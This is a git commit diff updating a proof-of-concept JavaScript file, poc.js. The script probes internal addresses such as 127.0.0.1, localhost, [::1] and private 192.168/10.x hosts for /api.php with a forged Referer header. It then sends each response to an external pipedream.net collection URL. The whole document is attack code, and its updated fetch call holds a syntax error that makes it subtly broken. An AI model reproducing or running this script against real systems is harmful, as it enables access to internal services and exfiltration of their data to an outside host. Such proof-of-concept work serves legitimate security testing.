5dd96f8cbdf58d19d5f7fe53ba2f539a405a021c
hashgrem <44004683+hashgrem@users.noreply.github.com>
2024-10-31 16:34:22 +0100

    Update poc.js

--- images/poc.js
+++ images/poc.js
@@ -1,14 +1,24 @@
-const targetUrl = "/api.php";
+const localIps = [
+    "http://127.0.0.1/api.php",
+    "http://localhost/api.php",
+    "http://[::1]/api.php",
+    "http://192.168.0.1/api.php",
+    "http://10.0.0.1/api.php"
+];
 
 function fetchInternalAPI() {
     console.log('func called');
-    fetch(targetUrl)
+    localIps.forEach(ip => {
+        fetch(ip, headers: {
+            "Referer": "http://127.0.0.1/"
+        })
         .then(response => response.text())
         .then(data => {
-            console.log("Resp from /api.php: ", data);
+            console.log(`Resp from ${ip}:`, data);
             fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
         })
-        .catch(error => console.error("Error fetching /api.php:", error));
+        .catch(error => console.error(`Error fetching ${ip}:`, error));
+    });
 }
 
 setTimeout(fetchInternalAPI, 2000);
